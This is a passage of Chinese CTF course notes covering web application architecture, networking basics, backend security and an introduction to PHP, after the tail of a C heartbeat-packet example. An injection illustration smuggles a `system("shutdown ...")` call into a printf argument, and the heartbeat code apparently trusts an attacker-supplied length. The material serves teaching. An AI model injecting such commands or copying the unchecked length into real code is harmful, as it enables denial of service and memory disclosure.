</span><span id="__span-2-46"><a id="__codelineno-2-46" name="__codelineno-2-46" href="#note-ctf-ctf-__codelineno-2-46"></a>
</span><span id="__span-2-47"><a id="__codelineno-2-47" name="__codelineno-2-47" href="#note-ctf-ctf-__codelineno-2-47"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">reply_heart_beat</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">pkt</span><span class="p">)</span>
</span><span id="__span-2-48"><a id="__codelineno-2-48" name="__codelineno-2-48" href="#note-ctf-ctf-__codelineno-2-48"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-2-49"><a id="__codelineno-2-49" name="__codelineno-2-49" href="#note-ctf-ctf-__codelineno-2-49"></a><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-2-50"><a id="__codelineno-2-50" name="__codelineno-2-50" href="#note-ctf-ctf-__codelineno-2-50"></a><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">written</span><span class="p">;</span>
</span><span id="__span-2-51"><a id="__codelineno-2-51" name="__codelineno-2-51" href="#note-ctf-ctf-__codelineno-2-51"></a>
</span><span id="__span-2-52"><a id="__codelineno-2-52" name="__codelineno-2-52" href="#note-ctf-ctf-__codelineno-2-52"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
</span><span id="__span-2-53"><a id="__codelineno-2-53" name="__codelineno-2-53" href="#note-ctf-ctf-__codelineno-2-53"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-2-54"><a id="__codelineno-2-54" name="__codelineno-2-54" href="#note-ctf-ctf-__codelineno-2-54"></a><span class="w">            </span><span class="n">written</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fwrite</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">stdout</span><span class="p">);</span>
</span><span id="__span-2-55"><a id="__codelineno-2-55" name="__codelineno-2-55" href="#note-ctf-ctf-__codelineno-2-55"></a><span class="w">            </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span id="__span-2-56"><a id="__codelineno-2-56" name="__codelineno-2-56" href="#note-ctf-ctf-__codelineno-2-56"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-2-57"><a id="__codelineno-2-57" name="__codelineno-2-57" href="#note-ctf-ctf-__codelineno-2-57"></a>
</span><span id="__span-2-58"><a id="__codelineno-2-58" name="__codelineno-2-58" href="#note-ctf-ctf-__codelineno-2-58"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">written</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">written</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">pkt</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>
</span><span id="__span-2-59"><a id="__codelineno-2-59" name="__codelineno-2-59" href="#note-ctf-ctf-__codelineno-2-59"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-2-60"><a id="__codelineno-2-60" name="__codelineno-2-60" href="#note-ctf-ctf-__codelineno-2-60"></a><span class="w">            </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-2-61"><a id="__codelineno-2-61" name="__codelineno-2-61" href="#note-ctf-ctf-__codelineno-2-61"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-2-62"><a id="__codelineno-2-62" name="__codelineno-2-62" href="#note-ctf-ctf-__codelineno-2-62"></a>
</span><span id="__span-2-63"><a id="__codelineno-2-63" name="__codelineno-2-63" href="#note-ctf-ctf-__codelineno-2-63"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
</span><span id="__span-2-64"><a id="__codelineno-2-64" name="__codelineno-2-64" href="#note-ctf-ctf-__codelineno-2-64"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-2-65"><a id="__codelineno-2-65" name="__codelineno-2-65" href="#note-ctf-ctf-__codelineno-2-65"></a>
</span><span id="__span-2-66"><a id="__codelineno-2-66" name="__codelineno-2-66" href="#note-ctf-ctf-__codelineno-2-66"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">()</span>
</span><span id="__span-2-67"><a id="__codelineno-2-67" name="__codelineno-2-67" href="#note-ctf-ctf-__codelineno-2-67"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-2-68"><a id="__codelineno-2-68" name="__codelineno-2-68" href="#note-ctf-ctf-__codelineno-2-68"></a><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
</span><span id="__span-2-69"><a id="__codelineno-2-69" name="__codelineno-2-69" href="#note-ctf-ctf-__codelineno-2-69"></a><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nb">true</span><span class="p">)</span>
</span><span id="__span-2-70"><a id="__codelineno-2-70" name="__codelineno-2-70" href="#note-ctf-ctf-__codelineno-2-70"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-2-71"><a id="__codelineno-2-71" name="__codelineno-2-71" href="#note-ctf-ctf-__codelineno-2-71"></a><span class="w">            </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_heart_beat</span><span class="p">();</span>
</span><span id="__span-2-72"><a id="__codelineno-2-72" name="__codelineno-2-72" href="#note-ctf-ctf-__codelineno-2-72"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span>
</span><span id="__span-2-73"><a id="__codelineno-2-73" name="__codelineno-2-73" href="#note-ctf-ctf-__codelineno-2-73"></a><span class="w">                </span><span class="k">continue</span><span class="p">;</span>
</span><span id="__span-2-74"><a id="__codelineno-2-74" name="__codelineno-2-74" href="#note-ctf-ctf-__codelineno-2-74"></a>
</span><span id="__span-2-75"><a id="__codelineno-2-75" name="__codelineno-2-75" href="#note-ctf-ctf-__codelineno-2-75"></a><span class="w">            </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reply_heart_beat</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
</span><span id="__span-2-76"><a id="__codelineno-2-76" name="__codelineno-2-76" href="#note-ctf-ctf-__codelineno-2-76"></a>
</span><span id="__span-2-77"><a id="__codelineno-2-77" name="__codelineno-2-77" href="#note-ctf-ctf-__codelineno-2-77"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
</span><span id="__span-2-78"><a id="__codelineno-2-78" name="__codelineno-2-78" href="#note-ctf-ctf-__codelineno-2-78"></a><span class="w">            </span><span class="p">{</span>
</span><span id="__span-2-79"><a id="__codelineno-2-79" name="__codelineno-2-79" href="#note-ctf-ctf-__codelineno-2-79"></a><span class="w">                </span><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
</span><span id="__span-2-80"><a id="__codelineno-2-80" name="__codelineno-2-80" href="#note-ctf-ctf-__codelineno-2-80"></a><span class="w">                </span><span class="k">continue</span><span class="p">;</span>
</span><span id="__span-2-81"><a id="__codelineno-2-81" name="__codelineno-2-81" href="#note-ctf-ctf-__codelineno-2-81"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-2-82"><a id="__codelineno-2-82" name="__codelineno-2-82" href="#note-ctf-ctf-__codelineno-2-82"></a><span class="w">            </span><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span><span class="c1">//释放内存</span>
</span><span id="__span-2-83"><a id="__codelineno-2-83" name="__codelineno-2-83" href="#note-ctf-ctf-__codelineno-2-83"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-2-84"><a id="__codelineno-2-84" name="__codelineno-2-84" href="#note-ctf-ctf-__codelineno-2-84"></a><span class="w">    </span><span class="p">}</span><span class="w">  </span>
</span></code></pre></div>
</details>
<h4 id="note-ctf-ctf-reverse">Reverse<a class="headerlink" href="#note-ctf-ctf-reverse" title="Permanent link">&para;</a></h4>
<p>反汇编IDA工具的使用</p>
<h4 id="note-ctf-ctf-misc">Misc<a class="headerlink" href="#note-ctf-ctf-misc" title="Permanent link">&para;</a></h4>
<h5 id="note-ctf-ctf-cyperchef">Cyperchef，神奇妙妙小工具<a class="headerlink" href="#note-ctf-ctf-cyperchef" title="Permanent link">&para;</a></h5>
<h5 id="note-ctf-ctf-lsb">LSB隐写<a class="headerlink" href="#note-ctf-ctf-lsb" title="Permanent link">&para;</a></h5>
<h4 id="note-ctf-ctf-crypto">Crypto<a class="headerlink" href="#note-ctf-ctf-crypto" title="Permanent link">&para;</a></h4>
<h5 id="note-ctf-ctf--">古典密码-跳舞的小人<a class="headerlink" href="#note-ctf-ctf--" title="Permanent link">&para;</a></h5>
<h5 id="note-ctf-ctf-rsa-">RSA解密-模逆元求解<a class="headerlink" href="#note-ctf-ctf-rsa-" title="Permanent link">&para;</a></h5></section><section class="print-page" id="note-ctf-web" heading-number="2.5.1.2"><h1 id="note-ctf-web-note-ctf-web">Web</h1><div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3168 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 387 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 4 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 16 分钟</p>
</div>
<h2 id="note-ctf-web-7-3-lec2-web">7-3 lec2-Web<a class="headerlink" href="#note-ctf-web-7-3-lec2-web" title="Permanent link">&para;</a></h2>
<blockquote>
<p>授课：叶耀阳</p>
</blockquote>
<h3 id="note-ctf-web-_1">前置<a class="headerlink" href="#note-ctf-web-_1" title="Permanent link">&para;</a></h3>
<p>下载 
- PHPstudy
- Node.js</p>
<h3 id="note-ctf-web-web">Web 应用架构：客户端+服务端<a class="headerlink" href="#note-ctf-web-web" title="Permanent link">&para;</a></h3>
<p>桌面应用和Web应用在架构上有显著的区别。桌面应用通常是在本地运行的独立程序，而Web应用则需要依赖客户端和服务端的协作。</p>
<ul>
<li>客户端：你的浏览器<ul>
<li>可视化：图形、图片、布局…… HTML + CSS</li>
<li>人机交互逻辑：按钮点击，登录，发送请求……JS</li>
<li>缓存、Cookie</li>
<li>安全：不能将私密的、不该获取的信息传出去（比如 Cookie），不能为所欲为（比如注销其他网站的账号）</li>
</ul>
</li>
<li>服务端：某台或很多台服务器<ul>
<li>认证与鉴权：如何证明你是你<ul>
<li>Authentication(认证)</li>
<li>Authorization(鉴权)</li>
</ul>
</li>
<li>处理请求：用户需要做什么？将结果返回客户端</li>
<li>服务器也可以有不同分工：前端后端、数据库……</li>
<li>安全：用户不能获得不该获取的信息（比如 flag），不能为所欲为（比如任意代码执行）</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-web-_2">网络：数据交换<a class="headerlink" href="#note-ctf-web-_2" title="Permanent link">&para;</a></h3>
<ul>
<li>数据包的传输与路由
想象一下，数据包就像是一封封信件，而网络则是遍布全球的邮政系统。当我们在电脑上点击发送邮件时，数据被切割成一个个小包裹，即数据包。这些数据包随后被送往最近的邮局，也就是路由器。路由器就像邮局的分拣员，根据包裹上的地址（即IP地址），决定将它们送往下一个邮局，直至最终到达目的地。这个过程中，每个路由器都会查看数据包的目的地，并选择最佳路径，确保数据包能够快速、准确地到达。</li>
<li>域名与DNS系统
在网络的世界里，IP地址就像是门牌号码，虽然精确，但记忆起来却颇为困难。这时，域名系统（DNS）就如同一个智能的电话簿，将复杂的IP地址转化为易于记忆的域名，比如<code>www.example.com</code>。当你在浏览器中输入一个域名时，DNS服务器会像查电话簿一样，找到对应的IP地址，并指引你的请求到达正确的服务器。</li>
<li>
<p>OSI模型和TCP/IP模型
正如我们写代码层层封装，计算机网络的总体架构也是分层的。这样每个层各司其职，下层上上层的基础设施，逐渐构建复杂的功能。</p>
</li>
<li>
<p>OSI 七层模型</p>
<p><img alt="Untitled" src="../NOTE/CTF/img/OSI.png" /></p>
</li>
<li>
<p>TCP/IP 四层模型：广泛使用</p>
<p><img alt="Untitled" src="../NOTE/CTF/img/TCP.png" /></p>
</li>
<li>
<p>TCP/IP 协议详解</p>
<ul>
<li>IP: 网络层=主机到主机，数据包寻址（快递公司）</li>
<li>TCP: 传输层=应用到应用，或者说端到端（菜鸟驿站）
无边界的字节流，类比电报报文，电报的格式是应用层协议该做的，电报本身只发字母数字</li>
</ul>
</li>
<li>
<p>HTTP 协议详解</p>
<ul>
<li>Hyper Text Transfer Protocol</li>
<li>超文本传输协议</li>
<li>应用层</li>
<li>特点：无状态，纯文本<ul>
<li>需要维持状态（比如：用户已登录）怎么办？Cookie</li>
</ul>
</li>
<li>格式</li>
</ul>
</li>
<li>
<p>DNS记录：</p>
</li>
<li>A记录：指向IPV4地址</li>
<li>AAAA记录：指向IPV6地址</li>
<li>CNAME： 别名，指向另外一个域名</li>
<li>TXT纯文本 </li>
<li>NS(Name server) 
      <img alt="" src="../NOTE/CTF/img/nslookup.png" />
      非权威，可能会缓存，不一定实时更新</li>
<li>MX SOA</li>
<li>命令<code>tracert</code>可以查看网站如何跳转</li>
<li>
<p>TTL time to live 防止它一直在跳，TTL用完了就死了</p>
</li>
<li>
<p>代理PROXY</p>
</li>
<li>正向代理：VPN：Virtual Private Network，看起来像在内网</li>
<li>反向代理：隐藏真实IP，部署CDN，部署防火墙，内网穿透 <strong>内网穿到外面来</strong> </li>
</ul>
<h3 id="note-ctf-web-_3">后端：业务逻辑<a class="headerlink" href="#note-ctf-web-_3" title="Permanent link">&para;</a></h3>
<p>后端是Web应用的核心，它负责处理业务逻辑、数据存储和安全。在这一部分，我们会介绍常见的后端技术栈，并重点讨论后端安全，尤其是如何防范和应对CTF（Capture the Flag）中常见的逻辑漏洞攻击。</p>
<ul>
<li>常见后端技术栈（如Node.js、PHP、Python、Ruby、Go、Rust 等）</li>
<li>后端安全：永远不要相信用户的数据，一切前端的过滤都等于没有过滤！</li>
<li>
<p>CTF: 通过逻辑漏洞等欺骗后端
逻辑漏洞：<code>if money!=0 then money-=price.</code> What if <code>money=-1</code> ?</p>
<p>没接触安全领域前关于安全的错觉：</p>
<ul>
<li>这么蠢的洞也有人写？</li>
<li>这么写怎么可能有洞？</li>
<li>这么多人用怎么可能有洞？</li>
</ul>
<p>事实：连SSH今年都还能有高危漏洞 CVE-2024-6387</p>
<p>真实例子（出自隔壁EE学院同学的手笔，科班-半路出家=安全+质量）：</p>
<p>注入：混淆了数据和代码。</p>
<p>例如<code>printf("%d", _____)</code></p>
<p>正常输入：<code>1</code> <code>2</code> <code>3</code> </p>
<p>恶意输入：<code>1); system("shutdown -s -t 0"); //</code></p>
<p>就变成了<code>printf("%d", 1); system("shutdown -s -t 0"); //)</code></p>
<p>爆了  </p>
</li>
</ul>
<h3 id="note-ctf-web-php">PHP 简单入门<a class="headerlink" href="#note-ctf-web-php" title="Permanent link">&para;</a></h3>
<p>PHP是最早的Web开发语言之一，它在Web开发历史上占有重要地位。</p>
<p>但它快死了。</p>
<p>早年只有静态网页，而后来有了jsp和php</p>
<ul>
<li>环境配置：PHP Study</li>
<li>
<p>变量定义</p>
<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ctf-web-__codelineno-0-1"></a><span class="x">$name = &quot;John&quot;; // 字符串变量</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ctf-web-__codelineno-0-2"></a><span class="x">$age = 25;      // 整数变量</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ctf-web-__codelineno-0-3"></a><span class="x">$height = 1.75; // 浮点数变量</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ctf-web-__codelineno-0-4"></a><span class="x">$isStudent = true; // 布尔变量</span>
</span></code></pre></div>
</li>
<li>
<p>短标签 <code>&lt;?=$a?&gt;</code></p>
</li>
<li>例子：</li>
</ul>
<details class="note">
<summary>Note</summary>
<div class="language-PHP highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ctf-web-__codelineno-1-1"></a><span class="x">&lt;!DOCTYPE html&gt;</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ctf-web-__codelineno-1-2"></a><span class="x">&lt;html&gt;</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ctf-web-__codelineno-1-3"></a><span class="x">&lt;head&gt;</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ctf-web-__codelineno-1-4"></a><span class="x">    &lt;title&gt;PHP 示例&lt;/title&gt;</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ctf-web-__codelineno-1-5"></a><span class="x">&lt;/head&gt;</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ctf-web-__codelineno-1-6"></a><span class="x">&lt;body&gt;</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ctf-web-__codelineno-1-7"></a><span class="x">    &lt;h1&gt;欢迎使用 PHP&lt;/h1&gt;</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ctf-web-__codelineno-1-8"></a><span class="x">    </span><span class="cp">&lt;?php</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ctf-web-__codelineno-1-9"></a>    <span class="c1">// 定义变量</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-ctf-web-__codelineno-1-10"></a>    <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&quot;John&quot;</span><span class="p">;</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-ctf-web-__codelineno-1-11"></a>    <span class="nv">$age</span> <span class="o">=</span> <span class="mi">25</span><span class="p">;</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#note-ctf-web-__codelineno-1-12"></a>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#note-ctf-web-__codelineno-1-13"></a>    <span class="c1">// 输出变量</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#note-ctf-web-__codelineno-1-14"></a>    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;你好，我的名字是 </span><span class="si">$name，我今年</span><span class="s2"> </span><span class="si">$age</span><span class="s2"> 岁。&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#note-ctf-web-__codelineno-1-15"></a>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#note-ctf-web-__codelineno-1-16"></a>    <span class="c1">// 条件语句</span>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#note-ctf-web-__codelineno-1-17"></a>    <span class="k">if</span> <span class="p">(</span><span class="nv">$age</span> <span class="o">&gt;=</span> <span class="mi">18</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#note-ctf-web-__codelineno-1-18"></a>        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;我已成年。&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#note-ctf-web-__codelineno-1-19"></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#note-ctf-web-__codelineno-1-20"></a>        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;我未成年。&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#note-ctf-web-__codelineno-1-21"></a>    <span class="p">}</span>
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#note-ctf-web-__codelineno-1-22"></a>
</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#note-ctf-web-__codelineno-1-23"></a>    <span class="c1">// 数组</span>
</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#note-ctf-web-__codelineno-1-24"></a>    <span class="nv">$fruits</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;apple&quot;</span><span class="p">,</span> <span class="s2">&quot;banana&quot;</span><span class="p">,</span> <span class="s2">&quot;cherry&quot;</span><span class="p">);</span>
</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#note-ctf-web-__codelineno-1-25"></a>    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;我喜欢的水果有：&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#note-ctf-web-__codelineno-1-26"></a>    <span class="k">echo</span> <span class="s2">&quot;&lt;ul&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#note-ctf-web-__codelineno-1-27"></a>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$fruits</span> <span class="k">as</span> <span class="nv">$fruit</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#note-ctf-web-__codelineno-1-28"></a>        <span class="k">echo</span> <span class="s2">&quot;&lt;li&gt;</span><span class="si">$fruit</span><span class="s2">&lt;/li&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#note-ctf-web-__codelineno-1-29"></a>    <span class="p">}</span>
</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#note-ctf-web-__codelineno-1-30"></a>    <span class="k">echo</span> <span class="s2">&quot;&lt;/ul&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#note-ctf-web-__codelineno-1-31"></a>
</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#note-ctf-web-__codelineno-1-32"></a>    <span class="c1">// HTML 短标签</span>
</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#note-ctf-web-__codelineno-1-33"></a>    <span class="cp">?&gt;</span>
</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#note-ctf-web-__codelineno-1-34"></a><span class="x">    &lt;p&gt;这是使用 HTML 短标签的示例：&lt;/p&gt;</span>
</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#note-ctf-web-__codelineno-1-35"></a><span class="x">    </span><span class="cp">&lt;?</span><span class="o">=</span> <span class="s2">&quot;当前时间是：&quot;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">)</span> <span class="cp">?&gt;</span>
</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#note-ctf-web-__codelineno-1-36"></a>
</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#note-ctf-web-__codelineno-1-37"></a><span class="x">    </span><span class="cp">&lt;?php</span>
</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#note-ctf-web-__codelineno-1-38"></a>    <span class="nv">$fr</span> <span class="o">=</span> <span class="s2">&quot;pear&quot;</span><span class="p">;</span>
</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#note-ctf-web-__codelineno-1-39"></a>    <span class="nv">$pear</span> <span class="o">=</span> <span class="mi">114</span><span class="p">;</span>
</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#note-ctf-web-__codelineno-1-40"></a>    <span class="nv">$lingo</span> <span class="o">=</span> <span class="mi">514</span><span class="p">;</span>
</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#note-ctf-web-__codelineno-1-41"></a>    <span class="k">echo</span> <span class="nv">$$fr</span><span class="p">;</span>
</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#note-ctf-web-__codelineno-1-42"></a>    <span class="cp">?&gt;</span>
</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#note-ctf-web-__codelineno-1-43"></a><span class="x">&lt;/body&gt;</span>
</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#note-ctf-web-__codelineno-1-44"></a><span class="x">&lt;/html&gt;</span>
</span></code></pre></div>
</details>
<p>获取 GET 参数与 Cookie 并查询数据库对应的用户：</p>
<details class="note">
<summary>Note</summary>
<div class="language-PHP highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-ctf-web-__codelineno-2-1"></a><span class="x">   </span><span class="cp">&lt;?php</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-ctf-web-__codelineno-2-2"></a><span class="c1">// 数据库连接信息</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-ctf-web-__codelineno-2-3"></a><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span><span class="p">;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-ctf-web-__codelineno-2-4"></a><span class="nv">$username</span> <span class="o">=</span> <span class="s2">&quot;root&quot;</span><span class="p">;</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-ctf-web-__codelineno-2-5"></a><span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-ctf-web-__codelineno-2-6"></a><span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&quot;test_db&quot;</span><span class="p">;</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-ctf-web-__codelineno-2-7"></a>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-ctf-web-__codelineno-2-8"></a><span class="c1">// 创建数据库连接</span>
